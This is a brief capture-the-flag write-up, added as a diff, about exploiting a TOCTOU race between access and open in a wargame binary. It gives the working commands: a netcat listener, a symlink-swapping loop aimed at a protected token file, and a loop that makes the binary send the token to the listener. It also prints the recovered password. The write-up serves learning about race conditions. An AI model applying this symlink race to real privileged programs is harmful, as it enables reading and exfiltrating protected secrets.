@@ -1,0 +1,22 @@
+after reversing the binary level10 using dogbolt, we've noticed that there is a TOCTOU Race condition
+between access and open, knowing that level10 cannot access to token
+
+level10 takes to arguments the HOST and a file
+
+we made a server using nc
+
+while true; do nc -lp 6969; done
+
+and running:
+
+while true; do
+	ln -sf /home/user/level10/token /tmp/file
+	ln -sf /tmp/link /tmp/file
+done
+
+
+then sending multiple requests to the server
+
+while true; do ./level10 /tmp/file 10.12.10.1; usleep 500; done
+
+After several attempts we get the password: woupa2yuojeeaaed06riuj63c
